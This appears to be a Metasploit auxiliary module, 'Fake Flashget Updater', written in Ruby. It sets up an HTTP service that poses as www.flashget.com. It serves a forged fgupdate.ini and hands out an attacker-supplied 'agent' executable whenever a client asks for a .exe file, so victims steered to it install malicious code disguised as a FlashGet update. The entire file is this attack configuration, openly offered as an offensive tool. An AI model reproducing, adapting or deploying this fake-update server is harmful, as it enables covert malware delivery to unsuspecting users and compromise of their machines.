require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Flashget Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Flashget updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		
		@base = {	
			'vh' => ['www.flashget.com'],
			'request' => [{
				'req' => '(/fgupdate.ini)', 
				'type' => 'file', 
				'bin'    => 0,
				'string' => '', 
				'parse' => 0,
				'file' => 'flashget_fgupdate.ini',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {
				'version'  => { 
					'val' => '7.1.7',
					'dynamic' => 0 
				},
			}
		}
	end
end
